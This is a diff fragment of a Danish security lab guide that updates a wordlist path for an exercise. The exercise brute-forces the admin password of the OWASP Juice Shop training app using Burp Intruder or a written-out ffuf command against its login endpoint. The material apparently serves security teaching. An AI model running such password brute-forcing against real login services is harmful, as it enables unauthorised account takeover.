@@ -366,11 +366,11 @@ er tilgængelig via browseren.
 
 Brug Burp Intruder til at bruteforce kodeordet til admin@juice-sh.op. 
 
-Brug `/usr/share/seclists/Passwords/2023-200_most_used_passwords.txt`
+Brug `/usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt`
 
 Hvis det er for langsomt, så brug evt `ffuf` som alternativ med kommandoen
 ```
-ffuf -w /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt \
+ffuf -w /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
      -u 'http://192.168.1.20:3010/rest/user/login' \
      -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
      -H "Content-Type: application/json" \
